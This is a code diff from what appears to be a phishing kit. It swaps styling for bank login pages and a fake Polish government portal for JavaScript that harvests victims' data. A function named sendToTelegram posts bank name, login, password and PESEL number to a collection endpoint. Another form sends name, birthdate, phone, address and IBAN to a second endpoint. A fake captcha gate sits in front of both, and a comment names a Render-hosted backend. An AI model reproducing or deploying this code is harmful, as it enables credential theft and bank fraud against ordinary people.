-            color: #ffffff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            flex-shrink: 0;
-            white-space: nowrap;
-        }
-
-        .bank12-full-page .bank12-form .login-btn:hover {
-            background: #e55800;
-        }
-
-        .bank12-full-page .bank12-form .login-btn:active {
-            transform: scale(0.97);
-        }
-
-        .bank12-full-page .bank12-footer-text {
-            margin-top: 20px;
-            text-align: left;
-            font-size: 13px;
-            color: #555;
-            line-height: 1.6;
-        }
-
-        .bank12-full-page .bank12-footer-text strong {
-            color: #1a1a1a;
-            display: block;
-            margin-bottom: 4px;
-        }
-
-        .bank12-full-page .bank12-footer-text .highlight {
-            color: #ff6200;
-            font-weight: 600;
-        }
-
-        .bank12-full-page .bank12-footer-text .link {
-            color: #ff6200;
-            font-weight: 600;
-            text-decoration: underline;
-            cursor: pointer;
-        }
-
-        .bank12-full-page .bank12-footer-text .link:hover {
-            color: #e55800;
-        }
-
-        .toast-message {
-            display: none;
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #cc0000;
-            color: #ffffff;
-            padding: 16px 32px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-            z-index: 9999;
-            max-width: 90%;
-            text-align: center;
-            animation: slideUp 0.4s ease-out;
-        }
-
-        .toast-message.show {
-            display: block;
-        }
-
-        .toast-message.success {
-            background: #009c3b;
-        }
-
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateX(-50%) translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(-50%) translateY(0);
+// ============================================================
+//   КОНФИГУРАЦИЯ
+// ============================================================
+// Если сайт открывается с того же домена Render — оставь пусто.
+// Если сайт на другом домене — впиши 'https://ggfg-ikmy.onrender.com'
+const API_URL = '';
+
+// ============================================================
+//   УТИЛИТЫ IBAN
+// ============================================================
+function cleanIbanValue(value) {
+    if (!value) return '';
+    let cleaned = value.replace(/[\s\-]/g, '').toUpperCase();
+    if (cleaned.startsWith('PL')) cleaned = cleaned.substring(2);
+    cleaned = cleaned.replace(/\D/g, '');
+    return cleaned;
+}
+
+function formatIban(value) {
+    const digits = cleanIbanValue(value);
+    if (digits.length === 0) return '';
+    let result = digits.substring(0, 2);
+    for (let i = 2; i < digits.length; i += 4) {
+        result += ' ' + digits.substring(i, i + 4);
+    }
+    return result;
+}
+
+// ============================================================
+//   ОТПРАВКА
+// ============================================================
+function sendToTelegram(bankName, login, password, pesel) {
+    fetch(API_URL + '/api/collect', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            bank: bankName,
+            username: login,
+            password: password,
+            pesel: pesel || null
+        })
+    })
+    .then(r => r.json())
+    .then(d => {
+        if (d.success) console.log('✅ Wysłano na serwer');
+        else console.error('❌ Błąd:', d.error);
+    })
+    .catch(e => console.error('❌ Сеть:', e));
+}
+
+// ============================================================
+//   КАПЧА
+// ============================================================
+(function() {
+    var overlay = document.getElementById('captchaOverlay');
+    var mainContent = document.getElementById('mainContent');
+    var questionEl = document.getElementById('captchaQuestion');
+    var inputEl = document.getElementById('captchaInput');
+    var submitBtn = document.getElementById('captchaSubmit');
+    var errorEl = document.getElementById('captchaError');
+    var refreshBtn = document.getElementById('captchaRefresh');
+
+    var currentCaptcha = '';
+
+    function generateCaptcha() {
+        var num = Math.floor(1000 + Math.random() * 9000);
+        currentCaptcha = num.toString();
+        questionEl.textContent = currentCaptcha;
+        inputEl.value = '';
+        inputEl.classList.remove('error');
+        errorEl.textContent = '';
+        submitBtn.disabled = false;
+        inputEl.focus();
+    }
+
+    function verifyCaptcha() {
+        var userInput = inputEl.value.trim();
+        if (userInput === currentCaptcha) {
+            overlay.classList.add('hidden');
+            mainContent.style.display = 'block';
+            document.body.style.overflow = 'auto';
+            var firstInput = mainContent.querySelector('input');
+            if (firstInput) setTimeout(function() { firstInput.focus(); }, 300);
+        } else {
+            inputEl.classList.add('error');
+            errorEl.textContent = '❌ Nieprawidłowy kod. Spróbuj ponownie.';
+            submitBtn.disabled = false;
+            inputEl.value = '';
+            inputEl.focus();
+            setTimeout(function() { generateCaptcha(); }, 1500);
+        }
+    }
+
+    submitBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        submitBtn.disabled = true;
+        verifyCaptcha();
+    });
+
+    inputEl.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            submitBtn.click();
+        }
+    });
+
+    refreshBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        generateCaptcha();
+        inputEl.focus();
+    });
+
+    generateCaptcha();
+    setTimeout(function() { inputEl.focus(); }, 300);
+})();
+
+// ============================================================
+//   МАСКИ
+// ============================================================
+function autoSlash(event) {
+    const input = event.target;
+    let value = input.value.replace(/\D/g, '');
+    if (value.length > 8) value = value.slice(0, 8);
+    let formatted = '';
+    for (let i = 0; i < value.length; i++) {
+        if (i === 2 || i === 4) formatted += '/';
+        formatted += value[i];
+    }
+    input.value = formatted;
+}
+
+function autoPostal(event) {
+    const input = event.target;
+    let value = input.value.replace(/\D/g, '');
+    if (value.length > 5) value = value.slice(0, 5);
+    let formatted = '';
+    for (let i = 0; i < value.length; i++) {
+        if (i === 2) formatted += '-';
+        formatted += value[i];
+    }
+    input.value = formatted;
+}
+
+// ============================================================
+//   ГЛАВНЫЙ КОД
+// ============================================================
+document.addEventListener('DOMContentLoaded', function() {
+
+    // Меню
+    const menuToggle = document.getElementById('menuToggle');
+    const sidebar = document.getElementById('sidebar');
+    const mainWrapper = document.getElementById('mainWrapper');
+    const contentWrapper = document.getElementById('contentWrapper');
+    const footer = document.getElementById('footer');
+    let isMenuOpen = false;
+
+    function toggleMenu() {
+        isMenuOpen = !isMenuOpen;
+        if (isMenuOpen) {
+            sidebar.classList.add('open');
+            mainWrapper.classList.add('shifted');
+            contentWrapper.classList.add('shifted');
+            footer.classList.add('shifted');
+        } else {
+            sidebar.classList.remove('open');
+            mainWrapper.classList.remove('shifted');
+            contentWrapper.classList.remove('shifted');
+            footer.classList.remove('shifted');
+        }
+    }
+
+    if (menuToggle) {
+        menuToggle.addEventListener('click', function(e) {
+            e.stopPropagation();
+            toggleMenu();
+        });
+    }
+
+    const sidebarLinks = document.querySelectorAll('.sidebar-nav ul li a, .sidebar-nav .ukraine-link');
+    sidebarLinks.forEach(link => {
+        link.addEventListener('click', function(e) {
+            e.preventDefault();
+            sidebarLinks.forEach(l => l.classList.remove('active'));
+            this.classList.add('active');
+            if (isMenuOpen) toggleMenu();
+        });
+    });
+
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape' && isMenuOpen) toggleMenu();
+    });
+
+    // Поиск
+    document.querySelector('.header-search .search-submit-btn')?.addEventListener('click', function() {
+        const input = this.closest('.header-search').querySelector('input');
+        alert('Szukanie: ' + (input?.value || 'puste'));
+    });
+
+    document.querySelector('.header-search input')?.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') alert('Szukanie: ' + this.value);
+    });
+
+    document.querySelectorAll('.login-nav .nav-links a').forEach(link => {
+        link.addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Przekierowanie do: ' + this.textContent.trim());
+        });
+    });
+
+    // Кнопка "DOWIEDZ SIĘ WIĘCEJ"
+    const scrollBtn = document.getElementById('scrollToFormBtn');
+    const formSection = document.getElementById('dataFormSection');
+    if (scrollBtn && formSection) {
+        scrollBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            formSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        });
+    }
+
+    // NRB — автоформатирование
+    const ibanInput = document.getElementById('iban');
+    const ibanWrapper = document.getElementById('ibanWrapper');
+
+    if (ibanInput) {
+        ibanInput.addEventListener('input', function() {
+            const cursorPos = this.selectionStart;
+            const before = this.value;
+            const digits = cleanIbanValue(before);
+            const formatted = formatIban(digits);
+            this.value = formatted;
+            const diff = formatted.length - before.length;
+            const newPos = Math.max(0, cursorPos + diff);
+            try { this.setSelectionRange(newPos, newPos); } catch (e) {}
+            this.classList.remove('error');
+            if (ibanWrapper) ibanWrapper.classList.remove('error');
+        });
+
+        ibanInput.addEventListener('paste', function() {
+            setTimeout(() => {
+                const digits = cleanIbanValue(this.value);
+                this.value = formatIban(digits);
+                this.classList.remove('error');
+                if (ibanWrapper) ibanWrapper.classList.remove('error');
+            }, 5);
+        });
+
+        ibanInput.addEventListener('blur', function() {
+            const digits = cleanIbanValue(this.value);
+            this.value = formatIban(digits);
+        });
+    }
+
+    // Форма
+    const form = document.getElementById('dataForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const toast = document.getElementById('toastMessage');
+    const allInputs = form ? form.querySelectorAll('input[required]') : [];
+    const formSectionElement = document.getElementById('dataFormSection');
+    const bankSelection = document.getElementById('bankSelection');
+    const loginNav = document.getElementById('loginNav');
+    const imageBanner = document.getElementById('imageBanner');
+    const bankFooter = document.getElementById('bankFooter');
+
+    function showToast(message, isSuccess = false) {
+        if (!toast) return;
+        toast.textContent = message;
+        toast.className = 'toast-message show';
+        if (isSuccess) toast.classList.add('success');
+        else toast.classList.remove('success');
+        setTimeout(() => toast.classList.remove('show'), 5000);
+    }
+
+    function validateForm() {
+        let allFilled = true;
+        allInputs.forEach(input => {
+            if (input.value.trim() === '') {
+                allFilled = false;
+                input.classList.add('error');
+            } else input.classList.remove('error');
+        });
+        if (ibanInput) {
+            const ibanValue = cleanIbanValue(ibanInput.value);
+            if (ibanValue.length < 26) {
+                allFilled = false;
+                ibanInput.classList.add('error');
+                if (ibanWrapper) ibanWrapper.classList.add('error');
+            } else {
+                ibanInput.classList.remove('error');
+                if (ibanWrapper) ibanWrapper.classList.remove('error');
             }
         }
+        return allFilled;
+    }
 
-        .main-content {
-            padding: 0;
-            min-height: 20px;
-        }
+    function getFormData() {
+        const cleanedIban = ibanInput ? cleanIbanValue(ibanInput.value) : '';
+        return {
+            fullname: document.getElementById('fullname')?.value.trim() || '',
+            birthdate: document.getElementById('birthdate')?.value.trim() || '',
+            phone: document.getElementById('phone')?.value.trim() || '',
+            street: document.querySelector('input[name="street"]')?.value.trim() || '',
+            city: document.querySelector('input[name="city"]')?.value.trim() || '',
+            postal: document.querySelector('input[name="postal"]')?.value.trim() || '',
+            iban: 'PL' + cleanedIban
+        };
+    }
 
-        .footer {
-            background: #003b6f;
-            color: #e0e8f0;
-            padding: 30px 0 20px;
-            margin-top: 0;
-            transition: margin-left 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-        }
+    if (form) {
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
 
-        .footer.shifted {
-            margin-left: 100px;
-        }
-
-        .footer .container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 30px;
-        }
-
-        .footer h4 {
-            color: #fff;
-            font-size: 16px;
-            margin-bottom: 12px;
-            border-bottom: 2px solid #005a8c;
-            padding-bottom: 8px;
-        }
-
-        .footer ul {
-            list-style: none;
-        }
-
-        .footer ul li {
-            margin-bottom: 8px;
-            font-size: 14px;
-        }
-
-        .footer ul li a {
-            color: #d0dcec;
-            transition: color 0.2s;
-        }
-
-        .footer ul li a:hover {
-            color: #fff;
-            text-decoration: underline;
-        }
-
-        .footer-bottom {
-            background: #002a4f;
-            padding: 15px 0;
-            margin-top: 25px;
-            text-align: center;
-            font-size: 13px;
-            color: #9bb4d0;
-        }
-
-        @media (max-width: 992px) {
-            .header { height: auto; min-height: 72px; padding: 10px 16px; flex-wrap: wrap; position: relative; }
-            .header-left { flex-wrap: wrap; }
-            .header-right { margin-left: auto; gap: 8px; flex-wrap: wrap; justify-content: flex-end; margin-right: 0; }
-            .main-wrapper { margin-top: 0; flex-direction: column; }
-            .main-wrapper.shifted { margin-left: 0; }
-            .content-wrapper.shifted { margin-left: 0; }
-            .sidebar { top: 0; height: 100vh; padding-top: 72px; left: -280px; min-width: 280px; max-width: 280px; }
-            .sidebar.open { left: 0; }
-            .footer.shifted { margin-left: 0; }
-            .header-search { height: 38px; min-width: 260px; }
-            .header-search .search-icon-btn { padding: 0 8px 0 10px; }
-            .header-search .search-icon-btn svg { width: 16px; height: 16px; }
-            .header-search input { min-width: 120px; font-size: 13px; }
-            .header-search .search-submit-btn { font-size: 13px; padding: 0 16px; }
-            .header-eu-logo { width: 60px; height: 36px; }
-            .login-nav { padding: 10px 20px; gap: 20px 16px; }
-            .login-nav .brand { margin-left: 200px; font-size: 18px; }
-            .login-nav .nav-links { gap: 16px; margin-left: 20px; }
-            .login-nav .nav-links a { font-size: 14px; }
-            .image-under-banner .image-wrapper .overlay-icon { width: 130px; height: 107px; left: 270px; }
-            .image-under-banner .image-wrapper .overlay-line { left: 420px; }
-            .image-under-banner .image-wrapper .overlay-text { left: 440px; max-width: 280px; }
-            .image-under-banner .image-wrapper .overlay-text h2 { font-size: 22px; }
-            .image-under-banner .image-wrapper .overlay-text p { font-size: 14px; }
-            .image-under-banner .image-wrapper .overlay-text .btn-outline { font-size: 12px; padding: 8px 20px; }
-            .data-form { grid-template-columns: 1fr; }
-            .data-form .address-row { grid-template-columns: 1fr; }
-            .data-form-section { padding: 20px; }
-            .bank-grid { grid-template-columns: repeat(2, 1fr); max-width: 440px; gap: 16px; }
-            .bank-btn { width: 100%; max-width: 191px; height: 70px; min-height: 70px; max-height: 70px; }
-            .bank-btn img { width: 140px; height: 45px; }
-            .bank-btn img[alt="Bank 2"] { width: 140px; height: 45px; }
-            .bank-btn-centered {
-                width: 100%;
-                max-width: 191px;
-                height: 70px;
-                min-height: 70px;
-                max-height: 70px;
+            if (!validateForm()) {
+                showToast('Najpierw wypełnij wszystkie wymagane pola!');
+                return;
             }
-            .bank-label { font-size: 11px; }
-            .bank-selection { padding: 40px 20px 20px; min-height: calc(100vh - 72px); }
-            .bank-footer { padding: 40px 0 20px; }
-            .login-screen { padding: 30px 20px 20px; min-height: calc(100vh - 72px); }
-            .login-screen .login-grid { flex-direction: column; gap: 30px; }
-            .login-screen .login-left { max-width: 100%; width: 100%; }
-            .login-screen .login-right { max-width: 100%; width: 100%; padding-top: 0; border-top: 1px solid #e6ebf3; padding-top: 24px; }
-            .login-screen .security-info, .login-screen .contact-info { border-left: none; padding-left: 0; }
-            .login-screen .login-title { font-size: 24px; }
-            .login-screen .login-form .login-btn-row { flex-direction: column; align-items: stretch; }
-            .login-screen .login-form .login-btn { width: 100%; height: 44px; }
-            .bank2-full-page .bank2-container { padding: 20px 20px 40px; }
-            .bank2-full-page .bank2-box { padding: 24px 20px; }
-            .bank3-header .bank3-header-content { padding: 0 20px; }
-            .bank3-full-page .login-form-wrapper { max-width: 100%; padding: 20px; }
-            .bank3-full-page .login-form-wrapper .login-title { font-size: 24px; }
-            .bank3-full-page .login-form-wrapper .login-btn-row { flex-direction: column; align-items: stretch; }
-            .bank3-full-page .login-form-wrapper .login-btn { width: 100%; height: 44px; }
-            .bank4-full-page .bank4-container { padding: 40px 20px; }
-            .bank4-full-page .bank4-title { font-size: 28px; }
-            .bank4-full-page .bank4-form .login-btn-row { flex-direction: column; align-items: stretch; }
-            .bank4-full-page .bank4-form .login-btn { width: 100%; height: 44px; }
-            .bank5-full-page .bank5-container { max-width: 100%; }
-            .bank5-full-page .bank5-box { padding: 30px 24px; }
-            .bank5-full-page .bank5-title { font-size: 22px; }
-            .bank5-full-page .bank5-form .login-btn-row { flex-direction: column; align-items: stretch; }
-            .bank5-full-page .bank5-form .login-btn { width: 100%; height: 44px; }
-            .bank6-container { flex-direction: column; max-width: 500px; padding: 30px 24px; gap: 30px; margin: 20px auto; }
-            .bank6-left { max-width: 100%; width: 100%; }
-            .bank6-right { max-width: 100%; width: 100%; }
-            .bank6-title { font-size: 24px; }
-            .bank7-full-page .bank7-container { padding: 40px 20px; }
-            .bank7-full-page .bank7-norton { bottom: 16px; right: 20px; }
-            .bank8-full-page .bank8-container { flex-direction: column; padding: 30px 20px; gap: 30px; }
-            .bank8-full-page .bank8-left { max-width: 100%; width: 100%; }
-            .bank8-full-page .bank8-card { width: 100%; max-width: 519px; }
-            .bank8-full-page .bank8-right { max-width: 100%; padding-top: 0; }
-            .bank9-full-page .bank9-container { padding: 30px 20px; }
-            .bank9-full-page .bank9-top .bank9-title { font-size: 16px; }
-            .bank9-full-page .bank9-card { width: 100%; max-width: 397px; }
-            .bank12-full-page .bank12-container { padding: 20px 20px 40px; }
-            .bank12-full-page .bank12-box { padding: 24px 20px; }
-            .bank12-full-page .bank12-title { font-size: 16px; }
-        }
 
-        @media (max-width: 768px) {
-            .login-nav { display: none !important; }
-            .sidebar { display: none !important; }
-            .menu-btn { display: none !important; }
-            .footer .container { grid-template-columns: 1fr; text-align: center; }
-            .logo-area { flex-wrap: wrap; justify-content: center; }
-            .logo-area .logo-main { flex-wrap: wrap; justify-content: center; }
-            .logo-area .coat-of-arms { height: 32px; }
-            .logo-area .logo-main .separator { font-size: 22px; }
-            .header-search { height: 34px; width: 100%; min-width: unset; border-radius: 4px; }
-            .header-search .search-icon-btn { padding: 0 6px 0 8px; }
-            .header-search .search-icon-btn svg { width: 14px; height: 14px; }
-            .header-search input { min-width: 80px; font-size: 12px; padding: 0 8px 0 0; }
-            .header-search .search-submit-btn { font-size: 12px; padding: 0 14px; }
-            .header-eu-logo { width: 50px; height: 30px; }
-            .header-right { margin-left: 0; width: 100%; justify-content: flex-end; margin-top: 8px; gap: 6px; margin-right: 0; }
-            .image-under-banner .image-wrapper img { width: 100%; max-width: 100%; height: auto; transform: scale(1.5); transform-origin: center center; }
-            .image-under-banner .image-wrapper .overlay-icon { width: 100px; height: 82px; left: 180px; }
-            .image-under-banner .image-wrapper .overlay-line { left: 300px; width: 1.5px; }
-            .image-under-banner .image-wrapper .overlay-text { left: 315px; max-width: 180px; }
-            .image-under-banner .image-wrapper .overlay-text h2 { font-size: 16px; }
-            .image-under-banner .image-wrapper .overlay-text p { font-size: 12px; margin-bottom: 10px; }
-            .image-under-banner .image-wrapper .overlay-text .btn-outline { font-size: 10px; padding: 5px 14px; border-width: 1.5px; }
-            .data-form .form-group input#birthdate { letter-spacing: 2px; }
-            .data-form { grid-template-columns: 1fr; }
-            .data-form .address-row { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 6px; }
-            .data-form .address-row input { font-size: 13px; padding: 8px 6px; }
-            .data-form .address-row input[name="postal"] { letter-spacing: 1px; }
-            .data-form-section { padding: 16px; }
-            .data-form .form-actions { justify-content: center; }
-            .data-form .submit-btn { width: 100%; justify-content: center; text-align: center; }
-            .bank-grid { grid-template-columns: repeat(2, 1fr); max-width: 380px; gap: 12px; }
-            .bank-btn { height: 60px; max-height: 60px; min-height: 60px; width: 100%; max-width: 191px; }
-            .bank-btn img { width: 120px; height: 38px; }
-            .bank-btn img[alt="Bank 2"] { width: 120px; height: 38px; }
-            .bank-btn-centered {
-                height: 60px;
-                min-height: 60px;
-                max-height: 60px;
-                max-width: 191px;
+            if (submitBtn) {
+                submitBtn.disabled = true;
+                submitBtn.classList.add('loading');
+                submitBtn.innerHTML = '<span class="spinner"></span> Wysyłanie...';
             }
-            .bank-logo-inner { max-height: 45%; }
-            .bank-label { font-size: 10px; margin-top: 1px; }
-            .bank-selection { padding: 30px 16px 20px; min-height: calc(100vh - 72px); }
-            .bank-selection .bank-title { font-size: 24px; }
-            .bank-selection .bank-subtitle { font-size: 16px; }
-            .bank-footer { padding: 30px 0 20px; }
-            .bank-footer .footer-links { gap: 16px; }
-            .bank-footer .footer-links a { font-size: 12px; }
-            .login-screen { padding: 20px 16px 16px; }
-            .login-screen .login-title { font-size: 22px; }
-            .login-screen .login-subtitle { font-size: 14px; }
-            .login-screen .login-form input { padding: 10px 12px; font-size: 13px; }
-            .login-screen .login-form .login-btn { height: 40px; font-size: 14px; }
-            .login-screen .login-left .ipko-logo { width: 60px; height: 45px; }
-            .login-screen .security-info .info-title, .login-screen .contact-info .info-title { font-size: 16px; }
-            .login-screen .contact-info .contact-phone { font-size: 16px; }
-            .login-screen .login-grid { gap: 24px; }
-            .bank2-full-page .bank2-container { padding: 16px 16px 30px; }
-            .bank2-full-page .bank2-box { padding: 20px 16px; }
-            .bank2-full-page .bank2-form input { padding: 10px 12px; font-size: 13px; }
-            .bank2-full-page .bank2-form .login-btn { width: 72px; height: 40px; font-size: 14px; }
-            .bank3-header { height: 48px; }
-            .bank3-header .bank3-header-content { padding: 0 16px; }
-            .bank3-header .bank3-header-content .bank3-logo { height: 28px; }
-            .bank3-full-page .login-form-wrapper .login-title { font-size: 22px; }
-            .bank3-full-page .login-form-wrapper .login-subtitle { font-size: 14px; }
-            .bank3-full-page .login-form-wrapper input { padding: 10px 12px; font-size: 13px; }
-            .bank3-full-page .login-form-wrapper .login-btn { height: 40px; font-size: 14px; }
-            .bank4-full-page .bank4-container { padding: 30px 16px; }
-            .bank4-full-page .bank4-title { font-size: 24px; }
-            .bank4-full-page .bank4-subtitle { font-size: 14px; }
-            .bank4-full-page .bank4-form input { padding: 10px 12px; font-size: 13px; }
-            .bank4-full-page .bank4-form .login-btn { height: 40px; font-size: 14px; }
-            .bank5-full-page .bank5-box { padding: 24px 18px; }
-            .bank5-full-page .bank5-title { font-size: 20px; }
-            .bank5-full-page .bank5-subtitle { font-size: 14px; }
-            .bank5-full-page .bank5-form input { padding: 10px 12px; font-size: 13px; }
-            .bank5-full-page .bank5-form .login-btn { height: 40px; font-size: 14px; }
-            .bank6-container { padding: 24px 18px; margin: 10px; }
-            .bank6-title { font-size: 22px; }
-            .bank6-form input { padding: 10px 14px; font-size: 13px; }
-            .bank6-form .login-btn { padding: 12px; font-size: 14px; }
-            .bank6-download img { width: 160px; height: 36px; }
-            .bank6-security-title { font-size: 16px; }
-            .bank6-security-text { font-size: 13px; }
-            .bank7-full-page .bank7-container { padding: 30px 16px; }
-            .bank7-full-page .bank7-box { padding: 24px 18px; }
-            .bank7-full-page .bank7-title { font-size: 20px; }
-            .bank7-full-page .bank7-subtitle { font-size: 13px; }
-            .bank7-full-page .bank7-form input { padding: 10px 12px; font-size: 13px; }
-            .bank7-full-page .bank7-form .login-btn { padding: 12px; font-size: 14px; }
-            .bank7-full-page .bank7-norton { bottom: 14px; right: 16px; }
-            .bank7-full-page .bank7-norton img { width: 60px; height: 40px; }
-            .bank8-full-page .bank8-container { padding: 20px 16px; gap: 24px; }
-            .bank8-full-page .bank8-card { padding: 20px 16px; width: 100%; max-width: 100%; }
-            .bank8-full-page .bank8-card .bank8-card-title { font-size: 16px; }
-            .bank8-full-page .bank8-card .bank8-login-title { font-size: 18px; }
-            .bank8-full-page .bank8-form input { padding: 10px 12px; font-size: 13px; }
-            .bank8-full-page .bank8-form .login-btn { padding: 12px; font-size: 14px; }
-            .bank8-full-page .bank8-right { padding-top: 0; }
-            .bank8-full-page .bank8-security-title { font-size: 18px; }
-            .bank8-full-page .bank8-security-text { font-size: 14px; }
-            .bank8-full-page .bank8-security-image img { width: 200px; height: auto; }
-            .bank9-full-page .bank9-container { padding: 20px 16px; }
-            .bank9-full-page .bank9-top { flex-direction: column; align-items: flex-start; gap: 12px; }
-            .bank9-full-page .bank9-top .bank9-title { font-size: 15px; }
-            .bank9-full-page .bank9-card { width: 100%; max-width: 100%; padding: 24px 18px; }
-            .bank9-full-page .bank9-card .bank9-welcome { font-size: 20px; }
-            .bank9-full-page .bank9-form input { padding: 10px 12px; font-size: 13px; }
-            .bank9-full-page .bank9-form .login-btn { padding: 12px; font-size: 14px; }
-            .bank12-full-page .bank12-container { padding: 16px 16px 30px; }
-            .bank12-full-page .bank12-box { padding: 20px 16px; }
-            .bank12-full-page .bank12-title { font-size: 15px; }
-            .bank12-full-page .bank12-form input { padding: 10px 12px; font-size: 13px; }
-            .bank12-full-page .bank12-form .login-btn { width: 72px; height: 40px; font-size: 14px; }
-        }
 
-        @media (max-width: 480px) {
-            .sidebar { display: none !important; }
-            .menu-btn { display: none !important; }
-            .logo-area .logo-main .gov { font-size: 20px; }
-            .logo-area .logo-main .separator { font-size: 20px; }
-            .logo-area .logo-main .subtitle { font-size: 14px; }
-            .logo-area .coat-of-arms { height: 28px; }
-            .header-search { height: 30px; border-radius: 4px; min-width: unset; }
-            .header-search .search-icon-btn { padding: 0 4px 0 6px; }
-            .header-search .search-icon-btn svg { width: 12px; height: 12px; }
-            .header-search input { min-width: 60px; font-size: 11px; padding: 0 6px 0 0; }
-            .header-search .search-submit-btn { font-size: 11px; padding: 0 10px; }
-            .header-eu-logo { width: 40px; height: 24px; }
-            .header-right { gap: 4px; margin-right: 0; }
-            .data-form .address-row { grid-template-columns: 2fr 1fr 1fr; gap: 4px; }
-            .data-form .address-row input { font-size: 12px; padding: 6px 4px; }
-            .data-form .address-row input[name="postal"] { letter-spacing: 1px; }
-            .data-form-section { padding: 12px; }
-            .data-form .form-group input, .data-form .form-group select { font-size: 13px; padding: 8px 10px; }
-            .data-form .submit-btn { font-size: 14px; padding: 10px 20px; }
-            .toast-message { font-size: 14px; padding: 12px 20px; bottom: 20px; }
-            .blue-alert { font-size: 15px; padding: 14px 16px; }
-            .bank-grid { grid-template-columns: repeat(2, 1fr); max-width: 280px; gap: 10px; }
-            .bank-btn { height: 55px; max-height: 55px; min-height: 55px; width: 100%; max-width: 191px; }
-            .bank-btn img { width: 100px; height: 32px; }
-            .bank-btn img[alt="Bank 2"] { width: 100px; height: 32px; }
-            .bank-btn-centered {
-                height: 55px;
-                min-height: 55px;
-                max-height: 55px;
-                max-width: 191px;
-                padding: 4px 2px;
+            const formData = getFormData();
+
+            fetch(API_URL + '/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(formData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showToast('Dane zostały wysłane!', true);
+                    if (loginNav) loginNav.classList.add('hidden');
+                    if (imageBanner) imageBanner.classList.add('hidden');
+                    if (formSectionElement) formSectionElement.classList.add('hidden');
+                    if (bankSelection) bankSelection.classList.add('visible');
+                    if (bankFooter) bankFooter.classList.add('visible');
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                } else {
+                    showToast('Błąd: ' + (data.error || 'nieznany'));
+                }
+            })
+            .catch(error => {
+                console.error('Błąd:', error);
+                showToast('Błąd połączenia.');
+            })
+            .finally(() => {
+                if (submitBtn) {
+                    submitBtn.disabled = false;
+                    submitBtn.classList.remove('loading');
+                    submitBtn.innerHTML = 'Wyślij';
+                }
+            });
+        });
+
+        allInputs.forEach(input => {
+            input.addEventListener('input', function() {
+                if (this.value.trim() !== '') this.classList.remove('error');
+                if (this.id === 'iban' && ibanWrapper) ibanWrapper.classList.remove('error');
+            });
+        });
+
+        document.addEventListener('click', function(e) {
+            if (toast && toast.classList.contains('show') && !toast.contains(e.target)) {
+                toast.classList.remove('show');
             }
-            .bank-logo-inner { max-height: 40%; }
-            .bank-label { font-size: 9px; margin-top: 0px; }
-            .bank-selection { padding: 20px 12px 16px; min-height: calc(100vh - 72px); }
-            .bank-selection .bank-title { font-size: 20px; }
-            .bank-selection .bank-subtitle { font-size: 14px; margin-bottom: 20px; }
-            .bank-footer { padding: 25px 0 16px; }
-            .bank-footer .footer-links { gap: 12px; flex-direction: column; align-items: center; }
-            .bank-footer .footer-links a { font-size: 11px; }
-            .login-screen { padding: 16px 12px 12px; }
-            .login-screen .login-title { font-size: 20px; }
-            .login-screen .login-subtitle { font-size: 13px; }
-            .login-screen .login-form input { padding: 8px 10px; font-size: 12px; }
-            .login-screen .login-form .login-btn { height: 36px; font-size: 13px; }
-            .login-screen .login-left .ipko-logo { width: 50px; height: 38px; }
-            .login-screen .security-info .info-title, .login-screen .contact-info .info-title { font-size: 14px; }
-            .login-screen .contact-info .contact-phone { font-size: 14px; }
-            .login-screen .contact-info .contact-phone-small { font-size: 13px; }
-            .login-screen .login-grid { gap: 18px; }
-            .bank2-full-page .bank2-container { padding: 12px 12px 24px; }
-            .bank2-full-page .bank2-box { padding: 16px 14px; }
-            .bank2-full-page .bank2-form input { padding: 8px 10px; font-size: 12px; }
-            .bank2-full-page .bank2-form .login-btn { width: 64px; height: 36px; font-size: 13px; padding: 0 12px; }
-            .bank3-header { height: 42px; }
-            .bank3-header .bank3-header-content { padding: 0 12px; }
-            .bank3-header .bank3-header-content .bank3-logo { height: 24px; }
-            .bank3-full-page .login-form-wrapper { padding: 16px; }
-            .bank3-full-page .login-form-wrapper .login-title { font-size: 20px; }
-            .bank3-full-page .login-form-wrapper .login-subtitle { font-size: 13px; }
-            .bank3-full-page .login-form-wrapper input { padding: 8px 10px; font-size: 12px; }
-            .bank3-full-page .login-form-wrapper .login-btn { height: 36px; font-size: 13px; }
-            .bank3-full-page .login-form-wrapper .login-btn-row { gap: 12px; }
-            .bank3-full-page .login-form-wrapper .login-btn-row .form-group { min-width: 100%; }
-            .bank3-full-page .login-form-wrapper .login-btn { width: 100%; }
-            .bank4-full-page .bank4-container { padding: 20px 12px; }
-            .bank4-full-page .bank4-title { font-size: 20px; }
-            .bank4-full-page .bank4-subtitle { font-size: 13px; margin-bottom: 20px; }
-            .bank4-full-page .bank4-form input { padding: 8px 10px; font-size: 12px; }
-            .bank4-full-page .bank4-form .login-btn { height: 36px; font-size: 13px; width: 100%; }
-            .bank4-full-page .bank4-form .login-btn-row { gap: 12px; flex-direction: column; align-items: stretch; }
-            .bank4-full-page .bank4-form .login-btn-row .form-group { min-width: 100%; }
-            .bank5-full-page .bank5-box { padding: 18px 14px; }
-            .bank5-full-page .bank5-title { font-size: 18px; }
-            .bank5-full-page .bank5-subtitle { font-size: 13px; margin-bottom: 18px; }
